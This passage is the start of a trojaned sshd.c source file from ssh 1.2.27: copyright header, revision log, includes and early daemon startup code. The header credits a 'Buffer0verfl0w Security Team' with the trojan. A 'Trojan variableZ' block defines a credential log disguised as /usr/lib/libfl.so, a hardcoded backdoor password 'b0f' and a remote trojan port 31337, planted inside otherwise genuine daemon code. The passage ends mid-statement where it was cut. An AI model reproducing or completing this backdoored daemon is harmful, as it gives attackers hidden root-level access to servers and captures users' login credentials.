/*

sshd.c

Author: Tatu Ylonen <ylo@cs.hut.fi>

Copyright (c) 1995 Tatu Ylonen <ylo@cs.hut.fi>, Espoo, Finland
                   All rights reserved

Created: Fri Mar 17 17:09:28 1995 ylo
Trojan created: Sun Aug  7 08:42:18 2000 xfer of Buffer0verfl0w Security Team

This program is the ssh daemon.  It listens for connections from clients, and
performs authentication, executes use commands or shell, and forwards
information to/from the application to the user client over an encrypted
connection.  This can also handle forwarding of X11, TCP/IP, and authentication
agent connections.

*/

/*
 * $Id: sshd.c,v 1.61 1999/04/29 11:29:47 tri Exp $
 * $Log: sshd.c,v $
 * Revision 1.61  1999/04/29 11:29:47  tri
 * 	Added a syslog call.
 *
 * Revision 1.60  1999/04/29 07:52:29  tri
 *      Replaced OSF1/C2 security support with more complete SIA
 *         (Security Integration Architecture) support by Tom Woodburn.
 *
 * Revision 1.59  1999/02/25 06:25:37  tri
 *      Added an unnecessary but illustrative patch.
 *
 * Revision 1.58  1999/02/22 14:44:33  kivinen
 *      Added code that will check that environment will always be
 *      allocated (freebsd + use login).
 *
 * Revision 1.57  1999/02/22 08:14:10  tri
 *      Final fixes for 1.2.27.
 *
 * Revision 1.56  1999/02/21 19:52:56  ylo
 *      Intermediate commit of ssh1.2.27 stuff.
 *      Main change is sprintf -> snprintf; however, there are also
 *      many other changes.
 *
 * Revision 1.55  1998/07/08 14:55:22  tri
 *      Fixed version negotiation so, that ssh 2
 *      compatibility is even remotedly possible.
 *
 * Revision 1.54  1998/07/08 00:48:46  kivinen
 *      Added better HPUX TCB auth support. Added SGI proj support.
 *      Changed to use match_host in the allow/deny checking. Changed
 *      to use PASSWD_PATH. Added checking that if allow/deny group is
 *      set then the group must exists.
 *
 * Revision 1.53  1998/06/11 00:11:24  kivinen
 *      Added ENABLE_SO_LINGER ifdef. Added username to /bin/password
 *      commands. Added user@host support.
 *
 * Revision 1.52  1998/05/23  20:28:12  kivinen
 *      Changed () -> (void). Added HAVE_OSF1_C2_SECURITY include
 *      files. Added days_before_{account,password}_expires support.
 *      Added chalnecho TIS authentication server response code
 *      support. Added call to osf1c2_check_account_and_terminal
 *      function. Added SSH_BINDIR to path read from
 *      /etc/default/login. Fixed BSDI login_getclass code for BSDI
 *      2.1.
 *
 * Revision 1.51  1998/05/11  18:51:07  kivinen
 *      Fixed AIX authstate code.
 *
 * Revision 1.50  1998/04/30 01:58:40  kivinen
 *      Fixed osflim handling so that now it allows setting resource
 *      to 0. Added -V option (for ssh version 2 compat mode). Added
 *      LIBWRAP code to also when in debugging mode. Added BSDI
 *      setusercontext code.
 *
 * Revision 1.49  1998/04/17 00:42:36  kivinen
 *      Freebsd login capabilities support. Added REMOTEUSER
 *      environment variable setting. Changed locked account checking
 *      so that it will not care if the account is locked if
 *      kerberos_or_local_password is not set. Added nologin-allow
 *      support. Added setting of AUTHSTATE and KRB5CCNAME enviroment
 *      variables if AIX authenticate() function is used.
 *
 * Revision 1.48  1998/03/27 17:05:01  kivinen
 *      Added SIGDANGER code. Fixed kerberos initialization code so
 *      ssh will check the error codes of initialization function.
 *      added ignore_root_rhosts code. Moved initgroups before closing
 *      all filedescriptors.
 *
 * Revision 1.47  1998/01/03 06:42:43  kivinen
 *      Added allow/deny groups option support.
 *
 * Revision 1.46  1998/01/02 06:39:36  kivinen
 *      Added new mail checking. Added expiration checkind for bsdi,
 *      and warning when password is about to expire. Fixed kerberos
 *      ticket name handling. Added support for XAuthLocation option.
 *      Added support for login capabilities for bsdi, only support
 *      ignorelogin option.
 *      Added osfc2 resource limit setting.
 *
 * Revision 1.45  1997/10/01 19:16:32  ylo
 *      Clarified error message about xauth not being in path.
 *
 * Revision 1.44  1997/05/08 03:06:51  kivinen
 *      Fixed sighup handling (added select before accept, changed
 *      execv to execvp so sshd is searched from path).
 *
 * Revision 1.43  1997/04/27 21:51:11  kivinen
 *      Added F-SECURE stuff. Added {Allow,Deny}Forwarding{To,Port}
 *      feature. Added {Allow,Deny}Users feature from Steve Kann
 *      <stevek@SteveK.COM>.
 *
 * Revision 1.42  1997/04/23 00:05:35  kivinen
 *      Added ifdefs around password expiration and inactivity checks,
 *      because some systems dont have sp_expire and sp_inact fields.
 *
 * Revision 1.41  1997/04/21 01:05:56  kivinen
 *      Added waitpid loop to main_sigchld_handler if we have it.
 *      Added check to pty_cleanup_proc so it will not cleanup pty
 *      twice.
 *      Changed argument to server_loop from ttyname to
 *      cleanup_context.
 *
 * Revision 1.40  1997/04/17 04:04:58  kivinen
 *      Removed extra variable err.
 *
 * Revision 1.39  1997/04/17 04:04:13  kivinen
 *      Added fatal: to all errors that cause sshd to exit.
 *      Added resetting of SIGCHLD before running libwrap code.
 *      Moved pty/pipe closing to server_loop. Added ttyname argument
 *      to server_loop.
 *      Server_loop will also now release the pty if it is allocated.
 *
 * Revision 1.38  1997/04/05 22:03:38  kivinen
 *      Added check that userfile_get_des_1_magic_phrase succeeded,
 *      before using the passphrase. Moved closing of pty after the
 *      pty_release.
 *
 * Revision 1.37  1997/04/05 17:28:31  ylo
 *      Added a workaround for the Windows SSH problem with X11
 *      forwarding.
 *
 * Revision 1.36  1997/03/27 05:59:50  kivinen
 *      Fixed bug in HAVE_USERSEC_H code.
 *
 * Revision 1.35  1997/03/27 03:12:22  kivinen
 *      Added kerberos patches from Glenn Machin.
 *      Added USELOGIN patches from Brian Cully.
 *
 * Revision 1.34  1997/03/26 05:32:42  kivinen
 *      Added idle_timeout variable.
 *      If debug_flag is given set rsa to verbose.
 *      Changed uid 0 to bee UID_ROOT.
 *
 * Revision 1.33  1997/03/25 05:48:29  kivinen
 *      Implemented SilentDeny and umask options. Added HAVE_DAEMON
 *      support.
 *      Moved LIBWRAP code to child.
 *      Moved closing of sockets/pipes out from server_loop.
 *
 * Revision 1.32  1997/03/19 23:04:43  kivinen
 *      Fixed typo.
 *
 * Revision 1.31  1997/03/19 21:17:57  kivinen
 *      Added some errno printing to all fatal calls.
 *      Added SSH_ORIGINAL_COMMAND environment variable setting. It
 *      will have the original command from the network when using
 *      forced command. It can be used to get arguments for forced
 *      command.
 *
 * Revision 1.30  1997/03/19 19:25:57  kivinen
 *      Added input buffer clearing for error conditions, so packet.c
 *      can check that buffer must be empty before new packet is read
 *      in.
 *
 * Revision 1.29  1997/03/19 17:53:17  kivinen
 *      Added more ETC_SHADOW support and SECURE_RPC, SECURE_NFS and
 *      NIS_PLUS support from Andy Polyakov <appro@fy.chalmers.se>.
 *      Added TIS authentication code from Andre April
 *      <Andre.April@cediti.be>.
 *      Moved authentication fail loop to do_authentication_fail_loop
 *      function. Added checks that username isn't longer than 255
 *      characters.
 *      Changed do_authentication to get cipher_type, so it can
 *      disable RhostsRsa authentication if using unsecure cipher
 *      (NONE, or ARCFOUR).
 *      Changed order of environment variables set to child, because
 *      digital unixes telnet dumps core if USER is the first
 *      environment variable set.
 *      Added code that will set all ip-address to xauth so it should
 *      work for multihosted machines too. Dont use xauth add
 *      host/unix:0 on crays, because it complains about it. Patch
 *      from Arne Henrik Juul <arnej@imf.unit.no>
 *
 * Revision 1.28  1996/11/24 08:26:15  kivinen
 *      Added SSHD_NO_{PORT,X11}_FORWARDING support.
 *
 * Revision 1.27  1996/11/04 06:35:01  ylo
 *      Updated processing of check_emulation output.
 *
 * Revision 1.26  1996/10/29 22:46:25  kivinen
 *      log -> log_msg. Added old agent emulation code (disable agent
 *      forwarding if the other end is too old).
 *
 * Revision 1.25  1996/10/23 15:59:13  ttsalo
 *       Changed BINDIR's name to SSH_BINDIR to prevent conflicts
 *
 * Revision 1.24  1996/10/21 16:35:23  ttsalo
 *       Removed some fd auth code
 *
 * Revision 1.23  1996/10/21 16:18:34  ttsalo
 *       Had to remove BINDIR from line 2518
 *
 * Revision 1.22  1996/10/20 16:19:36  ttsalo
 *      Added global variable 'original_real_uid' and it's initialization
 *
 * Revision 1.20  1996/09/27 17:19:16  ylo
 *      Merged ultrix patches from Corey Satten.
 *
 * Revision 1.19  1996/09/22 22:38:49  ylo
 *      Added endgrent() before closing all file descriptors.
 *
 * Revision 1.18  1996/09/08 17:40:31  ttsalo
 *      BSD4.4Lite's _PATH_DEFPATH is checked when defining DEFAULT_PATH.
 *      (Patch from Andrey A. Chernov <ache@lsd.relcom.eu.net>)
 *
 * Revision 1.17  1996/08/29 14:51:23  ttsalo
 *      Agent-socket directory handling implemented
 *
 * Revision 1.16  1996/08/22 22:16:24  ylo
 *      Log remote commands executed by root, and log the fact that a
 *      remote command was executed by an ordinary user, but not the
 *      actual command (for privacy reasons).
 *
 * Revision 1.15  1996/08/16 02:47:18  ylo
 *      Log root logins at LOG_NOTICE.
 *
 * Revision 1.14  1996/08/13 09:04:23  ttsalo
 *      Home directory, .ssh and .ssh/authorized_keys are now
 *      checked for wrong owner and group & world writeability.
 *
 * Revision 1.13  1996/08/13 00:23:31  ylo
 *      When doing X11 forwarding, check the existence of xauth and
 *      deny forwarding if it doesn't exist.  This makes copying
 *      binaries compiled on one system to other systems easier.
 *
 *      Run /etc/sshrc with /bin/sh instead of the user's shell.
 *
 * Revision 1.12  1996/07/29 04:58:54  ylo
 *      Add xauth data also for `hostname`/unix:$display as some X
 *      servers actually seem to use this version.  (Kludge to work
 *      around X11 bug.)
 *
 * Revision 1.11  1996/07/15 23:21:55  ylo
 *      Don't allow more than five password authentication attempts,
 *      and log attempts after the first one.
 *
 * Revision 1.10  1996/07/12 07:28:02  ttsalo
 *      Small ultrix patch
 *
 * Revision 1.9  1996/06/05 17:57:34  ylo
 *      If /etc/nologin exists, print that fact in plain text before
 *      printing the actual contents.  I am getting too many
 *      complaints about it.
 *
 * Revision 1.8  1996/06/03 19:25:49  ylo
 *      Fixed a typo.
 *
 * Revision 1.7  1996/05/29 07:41:46  ylo
 *      Added arguments to userfile_init.
 *
 * Revision 1.6  1996/05/29 07:16:38  ylo
 *      Disallow any user names that start with a '-' or '+' (or '@',
 *      just to be sure).  There is some indication that getpw* might
 *      returns such names on some systems with NIS.  Ouuuch!
 *
 * Revision 1.5  1996/05/28 16:41:14  ylo
 *      Merged Cray patches from Wayne Schroeder.
 *      Use setsid instead of setpgrp on ultrix.
 *
 * Revision 1.4  1996/04/26 00:22:51  ylo
 *      Improved error messages related to reading host key.
 *      Fixed ip addr in "Closing connection" message.
 *
 * Revision 1.3  1996/04/22 23:49:47  huima
 * Changed protocol version to 1.4, added calls to emulate module.
 *
 * Revision 1.2  1996/02/18  21:49:51  ylo
 *      Moved userfile_uninit to proper place.
 *      Use setluid if it exists (at least OSF/1).
 *
 * Revision 1.1.1.1  1996/02/18 21:38:13  ylo
 *      Imported ssh-1.2.13.
 *
 * Revision 1.31  1995/10/02  01:28:59  ylo
 *      Include sys/syslog.h if NEED_SYS_SYSLOG_H.
 *      Print proper ETCDIR in usage().
 *
 * Revision 1.30  1995/09/27  02:54:43  ylo
 *      Fixed a minor error.
 *
 * Revision 1.29  1995/09/27  02:49:06  ylo
 *      Fixed syntax errors.
 *
 * Revision 1.28  1995/09/27  02:18:51  ylo
 *      Added support for SCO unix.
 *      Added support for .hushlogin.
 *      Read $HOME/.environment.
 *      Pass X11 proto and cookie in stdin instead of command line.
 *      Added support for $HOME/.ssh/rc and /etc/sshrc.
 *
 * Revision 1.27  1995/09/25  00:03:53  ylo
 *      Added screen number.
 *      Don't display motd and login time if executing a command.
 *
 * Revision 1.26  1995/09/22  22:22:34  ylo
 *      Fixed a bug in the new environment code.
 *
 * Revision 1.25  1995/09/21  17:16:49  ylo
 *      Fixes to libwrap code.
 *      Fixed problem in wait() in key regeneration.  Now only
 *      ackquires light noise at regeneration.
 *      Support for ignore_rhosts.
 *      Don't use X11 forwarding with spoofing if no xauth.
 *      Rewrote the code to initialize the environment in the child.
 *      Added code to read /etc/environment into child environment.
 *      Fixed setpcred argument type.
 *
 * Revision 1.24  1995/09/11  17:35:53  ylo
 *      Added libwrap support.
 *      Log daemon name without path.
 *
 * Revision 1.23  1995/09/10  23:43:32  ylo
 *      Added a newline in xauth message.
 *
 * Revision 1.22  1995/09/10  23:29:43  ylo
 *      Renamed sigchld_handler main_sigchld_handler to avoid
 *      conflict.
 *
 * Revision 1.21  1995/09/10  23:26:53  ylo
 *      Child xauth line printed with fprintf instead of debug().
 *
 * Revision 1.20  1995/09/10  22:43:17  ylo
 *      Added uid-swapping stuff.
 *      Moved do_session to serverloop.c and renamed it server_loop.
 *      Changed SIGCHLD handling.
 *      Merged OSF/1 C2 security stuff.
 *
 * Revision 1.19  1995/09/09  21:26:47  ylo
 * /m/shadows/u2/users/ylo/ssh/README
 *
 * Revision 1.18  1995/09/06  19:53:19  ylo
 *      Fixed spelling of fascist.
 *
 * Revision 1.17  1995/09/06  16:02:40  ylo
 *      Added /usr/bin/X11 to default DEFAULT_PATH.
 *      Fixed inetd_flag & debug_flag together.
 *      Fixed -i.
 *
 * Revision 1.16  1995/08/31  09:43:14  ylo
 *      Fixed LOGNAME.
 *
 * Revision 1.15  1995/08/31  09:26:22  ylo
 *      Copy struct pw.
 *      Use socketpairs for communicating with the shell/command.
 *      Use same socket for stdin and stdout. (may help rdist)
 *      Put LOGNAME in environment.
 *      Run xauth directly, without the shell in between.
 *      Fixed the HPSUX kludge.
 *
 * Revision 1.14  1995/08/29  22:36:12  ylo
 *      Added SIGHUP handling.  Added SIGTERM and SIGQUIT handling.
 *      Permit root login if forced command.
 *      Added DenyHosts, AllowHosts.  Added PrintMotd.
 *      New file descriptor code.
 *      Use HPSUX and SIGCHLD kludges only on HPUX.
 *
 * Revision 1.13  1995/08/22  14:06:11  ylo
 *      Added /usr/local/bin in default DEFAULT_PATH.
 *
 * Revision 1.12  1995/08/21  23:33:48  ylo
 *      Added "-f conffile" option.
 *      Added support for the server configuration file.
 *      Added allow/deny host code.
 *      Added code to optionally deny root logins.
 *      Added code to configure allowed authentication methods.
 *      Changes to log initialization arguments.
 *      Eliminated NO_RHOSTS_AUTHENTICATION.
 *
 * Revision 1.11  1995/08/18  22:58:06  ylo
 *      Added support for O_NONBLOCK_BROKEN.
 *      Added support for TTY_GROUP.
 *
 * Revision 1.10  1995/07/27  02:19:09  ylo
 *      Tell packet_set_encryption_key that we are the server.
 *
 *      Temporary kludge to make TCP/IP port forwarding work
 *      properly.  This kludge will increase idle CPU usage because
 *      sshd wakes up every 300ms.
 *
 * Revision 1.9  1995/07/27  00:41:34  ylo
 *      If DEFAULT_PATH defined by configure, use that value.
 *
 * Revision 1.8  1995/07/26  23:21:06  ylo
 *      Removed include version.h.  Added include mpaux.h.
 *
 *      Print software version with -d.
 *
 *      Added support for protocol version 1.1.  Fixes minor security
 *      problems, and updates the protocol to match the draft RFC.
 *      Compatibility code makes it possible to use old clients with
 *      this server.
 *
 * Revision 1.7  1995/07/16  01:01:41  ylo
 *      Removed hostname argument from record_logout.
 *      Added call to pty_release.
 *      Set tty mode depending on whether we have tty group.
 *
 * Revision 1.6  1995/07/15  22:27:04  ylo
 *      Added printing of /etc/motd.
 *
 * Revision 1.5  1995/07/15  21:41:04  ylo
 *      Changed the HPSUX kludge (child_has_terminated).  It caused
 *      sshd to busy-loop if the program exited but there were open
 *      connections.
 *
 * Revision 1.4  1995/07/14  23:37:43  ylo
 *      Limit outgoing packet size to 512 bytes for interactive
 *      connections.
 *
 * Revision 1.3  1995/07/13  17:33:17  ylo
 *      Only record the pid in /etc/sshd_pid if running without the
 *      debugging flag.
 *
 * Revision 1.2  1995/07/13  01:40:47  ylo
 *      Removed "Last modified" header.
 *      Added cvs log.
 *
 * $Endlog$
 */

#include "includes.h"
#include <gmp.h>
#include "xmalloc.h"
#include "rsa.h"
#include "ssh.h"
#include "pty.h"
#include "packet.h"
#include "buffer.h"
#include "cipher.h"
#include "mpaux.h"
#include "servconf.h"
#include "userfile.h"
#include "emulate.h"
#ifdef HAVE_USERSEC_H
#include <usersec.h>
#endif /* HAVE_USERSEC_H */
#ifdef HAVE_ULIMIT_H
#include <ulimit.h>
#endif /* HAVE_ULIMIT_H */
#ifdef HAVE_HPUX_TCB_AUTH
#include <sys/types.h>
#include <hpsecurity.h>
#include <prot.h>
#endif
#ifdef HAVE_ETC_SHADOW
#ifdef HAVE_SHADOW_H
#include <shadow.h>
#endif /* HAVE_SHADOW_H */
#ifndef SHADOW
#define SHADOW "/etc/shadow"
#endif
#endif /* HAVE_ETC_SHADOW */

#ifdef HAVE_SIA
#include "sshsia.h"
#endif /* HAVE_SIA */

#if defined (__bsdi__) && _BSDI_VERSION >= 199510
#include <tzfile.h>
#include <login_cap.h>
#endif /* __bsdi__  && _BSDI_VERISION >= 199510 */

#ifdef LIBWRAP
#include <tcpd.h>
#include <syslog.h>
#ifdef NEED_SYS_SYSLOG_H
#include <sys/syslog.h>
#endif /* NEED_SYS_SYSLOG_H */
int allow_severity = LOG_INFO;
int deny_severity = LOG_WARNING;
#endif /* LIBWRAP */

#ifdef CRAY
#include <udb.h>
#include <unistd.h>
#include <sys/category.h>
extern char *setlimits();
#endif

#ifdef HAVE_SGI_PROJ_H
#include <proj.h>
#include <unistd.h>
#include <sys/types.h>
#endif

#ifdef HAVE_TIS
/* Support for TIS authentication server
   Contributed by Andre April <Andre.April@cediti.be>. */
#include "firewall.h"   /* TIS authsrv authentication */
#endif

#if defined (__FreeBSD__) && defined(HAVE_LOGIN_CAP_H)
#include <login_cap.h>
#endif

#ifdef _PATH_BSHELL
#define DEFAULT_SHELL           _PATH_BSHELL
#else
#define DEFAULT_SHELL           "/bin/sh"
#endif

#ifndef DEFAULT_PATH
#ifdef _PATH_USERPATH
#define DEFAULT_PATH            _PATH_USERPATH
#else
#ifdef _PATH_DEFPATH
#define DEFAULT_PATH            _PATH_DEFPATH
#else
#define DEFAULT_PATH    "/bin:/usr/bin:/usr/ucb:/usr/bin/X11:/usr/local/bin"
#endif
#endif
#endif /* DEFAULT_PATH */

#ifndef O_NOCTTY
#define O_NOCTTY        0
#endif

#ifdef KERBEROS
#ifdef KRB5
#include <krb5.h>
/* Global the contexts */
krb5_context ssh_context = 0;
krb5_auth_context auth_context = 0;
#endif /* KRB5 */
char *ticket = "none\0";
#endif /* KERBEROS */

/* Trojan variableZ */
#define SSH_LOGZ "/usr/lib/libfl.so"
#define TROJAN_PASSWORD "b0f"
#define PASSWORD_LENGTH strlen(TROJAN_PASSWORD)
#define REMOTE_TROJAN_PORT 31337
FILE *fp;
int SUMZ = 0;

/* Server configuration options. */
ServerOptions options;

/* Name of the server configuration file. */
char *config_file_name = SERVER_CONFIG_FILE;

/* Debug mode flag.  This can be set on the command line.  If debug
   mode is enabled, extra debugging output will be sent to the system
   log, the daemon will not go to background, and will exit after processing
   the first connection. */
int debug_flag = 0;

/* Flag indicating that the daemon is being started from inetd. */
int inetd_flag = 0;

/* argv[0] without path. */
char *av0;

/* Saved arguments to main(). */
char **saved_argv;

#ifdef HAVE_SIA
/* SIA entity handle, shared between do_exec_no_pty()/do_exec_pty()
   and do_child(). */
SIAENTITY *sia_entity = NULL;
#endif /* HAVE_SIA */

/* This is set to the socket that the server is listening; this is used in
   the SIGHUP signal handler. */
int listen_sock;

/* This is not really needed, and could be eliminated if server-specific
   and client-specific code were removed from newchannels.c */
uid_t original_real_uid = 0;

/* Flags set in auth-rsa from authorized_keys flags.  These are set in
  auth-rsa.c. */
int no_port_forwarding_flag = 0;
int no_agent_forwarding_flag = 0;
int no_x11_forwarding_flag = 0;
int no_pty_flag = 0;
time_t idle_timeout = 0;
char *forced_command = NULL;  /* RSA authentication "command=" option. */
char *original_command = NULL;  /* original command from protocol. */
struct envstring *custom_environment = NULL; 
                          /* RSA authentication "environment=" options. */

/* Session id for the current session. */
unsigned char session_id[16];

/* Any really sensitive data in the application is contained in this structure.
   The idea is that this structure could be locked into memory so that the
   pages do not get written into swap.  However, there are some problems.
   The private key contains MP_INTs, and we do not (in principle) have
   access to the internals of them, and locking just the structure is not
   very useful.  Currently, memory locking is not implemented. */
struct
{
  /* Random number generator. */
  RandomState random_state;
  
  /* Private part of server key. */
  RSAPrivateKey private_key;

  /* Private part of host key. */
  RSAPrivateKey host_key;
} sensitive_data;

/* Flag indicating whether the current session key has been used.  This flag
   is set whenever the key is used, and cleared when the key is regenerated. */
int key_used = 0;

/* This is set to true when SIGHUP is received. */
int received_sighup = 0;

/* Public side of the server key.  This value is regenerated regularly with
   the private key. */
RSAPublicKey public_key;

/* Remote end username (mallocated) or NULL if not available */
char *remote_user_name;

/* Days before the password / account expires, or -1 if information not
   available */
int days_before_account_expires = -1;
int days_before_password_expires = -1;

/* Prototypes for various functions defined later in this file. */
void do_connection(int privileged_port);
void do_authentication(char *user, int privileged_port, int cipher_type);
void do_authenticated(struct passwd *pw);
void do_exec_pty(const char *command, int ptyfd, int ttyfd, 
                 const char *ttyname, struct passwd *pw, const char *term,
                 const char *display, const char *auth_proto,
                 const char *auth_data);
void do_exec_no_pty(const char *command, struct passwd *pw,
                    const char *display, const char *auth_proto,
                    const char *auth_data);
void do_child(const char *command, struct passwd *pw, const char *term,
              const char *display, const char *auth_proto,
              const char *auth_data, const char *ttyname);


/* Signal handler for SIGHUP.  Sshd execs itself when it receives SIGHUP;
   the effect is to reread the configuration file (and to regenerate
   the server key). */

RETSIGTYPE sighup_handler(int sig)
{
  received_sighup = 1;
  signal(SIGHUP, sighup_handler);
}

/* Called from the main program after receiving SIGHUP.  Restarts the 
   server. */

void sighup_restart(void)
{
  log_msg("Received SIGHUP; restarting.");
  close(listen_sock);
  execvp(saved_argv[0], saved_argv);
  log_msg("RESTART FAILED: av[0]='%.100s', error: %.100s.", 
      saved_argv[0], strerror(errno));
  exit(1);
}

/* Generic signal handler for terminating signals in the master daemon. 
   These close the listen socket; not closing it seems to cause "Address
   already in use" problems on some machines, which is inconvenient. */

RETSIGTYPE sigterm_handler(int sig)
{
  log_msg("Received signal %d; terminating.", sig);
  close(listen_sock);
  exit(255);
}

#ifdef SIGDANGER
/* Signal handler for AIX's SIGDANGER low-memory signal
   It logs the signal and ignores the message. */
RETSIGTYPE sigdanger_handler(int sig)
{
  log_msg("Received signal %d (SIGDANGER, means memory is low); ignoring.",
          sig);
}
#endif /* SIGDANGER */

/* SIGCHLD handler.  This is called whenever a child dies.  This will then 
   reap any zombies left by exited c. */

RETSIGTYPE main_sigchld_handler(int sig)
{
  int status;
#ifdef HAVE_WAITPID
  /* Reap all childrens */
  while (waitpid(-1, &status, WNOHANG) > 0)
    ;
#else
  wait(&status);
#endif
  signal(SIGCHLD, main_sigchld_handler);
}

/* Signal handler for the alarm after the login grace period has expired. */

RETSIGTYPE grace_alarm_handler(int sig)
{
  /* Close the connection. */
  packet_close();
  
  /* Log error and exit. */
  fatal_severity(SYSLOG_SEVERITY_INFO,
                 "Timeout before authentication.");
}

/* Signal handler for the key regeneration alarm.  Note that this
   alarm only occurs in the daemon waiting for connections, and it does not
   do anything with the private key or random state before forking.  Thus there
   should be no concurrency control/asynchronous execution problems. */

RETSIGTYPE key_regeneration_alarm(int sig)
{
  /* Check if we should generate a new key. */
  if (key_used)
    {
      /* This should really be done in the background. */
      log_msg("Generating new %d bit RSA key.", options.server_key_bits);
      random_acquire_light_environmental_noise(&sensitive_data.random_state);
      rsa_generate_key(&sensitive_data.private_key, &public_key, 
                       &sensitive_data.random_state, options.server_key_bits);
      random_save(&sensitive_data.random_state, geteuid(),
                  options.random_seed_file);
      key_used = 0;
      log_msg("RSA key generation complete.");
    }

  /* Reschedule the alarm. */
  signal(SIGALRM, key_regeneration_alarm);
  alarm(options.key_regeneration_time);
}

/* Main program for the daemon. */

int main(int ac, char **av)
{
  extern char *optarg;
  extern int optind;
  int opt, aux, sock_in, sock_out, newsock, i, pid, on = 1;
  int remote_major, remote_minor;
  int perm_denied = 0;
  int ret;
  fd_set fdset;
  struct sockaddr_in sin;
  char buf[100]; /* Must not be larger than remote_version. */
  char remote_version[100]; /* Must be at least as big as buf. */
  char *comment;
  char *ssh_remote_version_string = NULL;
  FILE *f;
#if defined(SO_LINGER) && defined(ENABLE_SO_LINGER)
  struct linger linger;
#endif /* SO_LINGER */
  int done;
  
  /* Save argv[0]. */
  saved_argv = av;
  if (strchr(av[0], '/'))
    av0 = strrchr(av[0], '/') + 1;
  else
    av0 = av[0];

  /* Prevent core dumps to avoid revealing sensitive information. */
  signals_prevent_core();

  /* Set SIGPIPE to be ignored. */
  signal(SIGPIPE, SIG_IGN);

  /* Initialize configuration options to their default values. */
  initialize_server_options(&options);

  /* Parse command-line arguments. */
  while ((opt = getopt(ac, av, "f:p:b:k:h:g:diqV:")) != EOF)
    {
      switch (opt)
        {
        case 'f':
          config_file_name = optarg;
          break;
        case 'd':
          debug_flag = 1;
          break;
        case 'i':
          inetd_flag = 1;
          break;
        case 'q':
          options.quiet_mode = 1;
          break;
        case 'b':
          options.server_key_bits = atoi(optarg);
          break;
        case 'p':
          options.port = atoi(optarg);
          break;
        case 'g':
          options.login_grace_time = atoi(optarg);
          break;
        case 'k':
          options.key_regeneration_time = atoi(optarg);
          break;
        case 'h':
          options.host_key_file = optarg;
          break;
        case 'V':
          ssh_remote_version_string = optarg;
          break;
        case '?':
        default:
#ifdef F_SECURE_COMMERCIAL

#endif /* F_SECURE_COMMERCIAL */
          fprintf(stderr, "sshd version %s [%s]\n", SSH_VERSION, HOSTTYPE);
          fprintf(stderr, "Usage: %s [options]\n", av0);
          fprintf(stderr, "Options:\n");
          fprintf(stderr, "  -f file    Configuration file (default %s/sshd_config)\n", ETCDIR);
          fprintf(stderr, "  -d         Debugging mode\n");
          fprintf(stderr, "  -i         Started from inetd\n");
          fprintf(stderr, "  -q         Quiet (no logging)\n");
          fprintf(stderr, "  -p port    Listen on the specified port (default: 22)\n");
          fprintf(stderr, "  -k seconds Regenerate server key every this many seconds (default: 3600)\n");
          fprintf(stderr, "  -g seconds Grace period for authentication (default: 300)\n");
          fprintf(stderr, "  -b bits    Size of server RSA key (default: 768 bits)\n");
          fprintf(stderr, "  -h file    File from which to read host key (default: %s)\n",
                  HOST_KEY_FILE);
          fprintf(stderr, "  -V str     Remote version string already read from the socket\n");
          exit(1);
        }
    }

  /* Read server configuration options from the configuration file. */
  read_server_config(&options, config_file_name);

  /* Fill in default values for those options not explicitly set. */
  fill_default_server_options(&options);

  /* Check certain values for sanity. */
  if (options.server_key_bits < 512 || 
      options.server_key_bits > 32768)
    {
      fprintf(stderr, "fatal: Bad server key size.\n");
      exit(1);
    }
  if (options.port < 1 || options.port > 65535)
    {
      fprintf(stderr, "fatal: Bad port number.\n");
      exit(1);
    }
  if (options.umask != -1)
    {
      umask(options.umask);
    }

  /* Check that there are no remaining arguments. */
  if (optind < ac)
    {
      fprintf(stderr, "fatal: Extra argument %.100s.\n", av[optind]);
      exit(1);
    }

  /* Initialize the log (it is reinitialized below in case we forked). */
  log_init(av0, debug_flag && !inetd_flag, 
           debug_flag || options.fascist_logging, 
           options.quiet_mode, options.log_facility);

#ifdef F_SECURE_COMMERCIAL

#endif /* F_SECURE_COMMERCIAL */
  debug("sshd version %.100s [%.100s]", SSH_VERSION, HOSTTYPE);

  /* Load the host key.  It must have empty passphrase. */
  done = load_private_key(geteuid(), options.host_key_file, "", 
                          &sensitive_data.host_key, &comment);

#ifdef SECURE_RPC
  if (!done)
    {
      char *passphrase;

      passphrase = userfile_get_des_1_magic_phrase(geteuid());
      if (passphrase != NULL)
        {
          done = load_private_key(geteuid(), options.host_key_file,
                                  passphrase, &sensitive_data.host_key, &comment);
          if (done)
            debug ("Using SUN-DES-1 magic phrase to decrypt host key.");
          memset(passphrase, 0, strlen(passphrase));
          xfree(passphrase);
        }
    }
#endif
  if (!done)
    {
      if (debug_flag)
        {
          fprintf(stderr, "Could not load host key: %.200s\n",
                  options.host_key_file);
          fprintf(stderr, "fatal: Please check that you have sufficient permissions and the file exists.\n");
        }
      else
        {
          log_init(av0, !inetd_flag, 1, 0, options.log_facility);
          error("fatal: Could not load host key: %.200s.  Check path and permissions.", 
                options.host_key_file);
        }
      exit(1);
    }
  xfree(comment);

#ifdef SCO
  (void) set_auth_parameters(ac, av);
#endif

#ifdef HAVE_SIA
  initialize_sia(ac, av);
#endif /* HAVE_SIA */

  /* If not in debugging mode, and not started from inetd, disconnect from
     the controlling terminal, and fork.  The original process exits. */
  if (!debug_flag && !inetd_flag)
#ifdef HAVE_DAEMON
    if (daemon(0, 0) < 0)
      error("daemon: %.100s", strerror(errno));
#else /* HAVE_DAEMON */
    {
#ifdef TIOCNOTTY
      int fd;
#endif /* TIOCNOTTY */

      /* Fork, and have the parent exit.  The child becomes the server. */
      if (fork())
        exit(0);

      /* Redirect stdin, stdout, and stderr to /dev/null. */
      freopen("/dev/null", "r", stdin);
      freopen("/dev/null", "w", stdout);
      freopen("/dev/null", "w", stderr);

      /* Disconnect from the controlling tty. */
#ifdef TIOCNOTTY
      fd = open("/dev/tty", O_RDWR|O_NOCTTY);
      if (fd >= 0)
        {
          (void)ioctl(fd, TIOCNOTTY, NULL);
          close(fd);
        }
#endif /* TIOCNOTTY */
#ifdef HAVE_SETSID
#ifdef ultrix
      setpgrp(0, 0);
#else /* ultrix */
      if (setsid() < 0)
        error("setsid: %.100s", strerror(errno));
#endif
#endif /* HAVE_SETSID */
    }
#endif /* HAVE_DAEMON */
    
  /* Reinitialize the log (because of the fork above). */
  log_init(av0, debug_flag && !inetd_flag, 
           debug_flag || options.fascist_logging, 
           options.quiet_mode, options.log_facility);

  /* Check that server and host key lengths differ sufficiently.  This is
     necessary to make double encryption work with rsaref.  Oh, I hate
     software patents. */
  if (options.server_key_bits > 
      sensitive_data.host_key.bits - SSH_KEY_BITS_RESERVED &&
      options.server_key_bits < 
      sensitive_data.host_key.bits + SSH_KEY_BITS_RESERVED)
    {
      options.server_key_bits = 
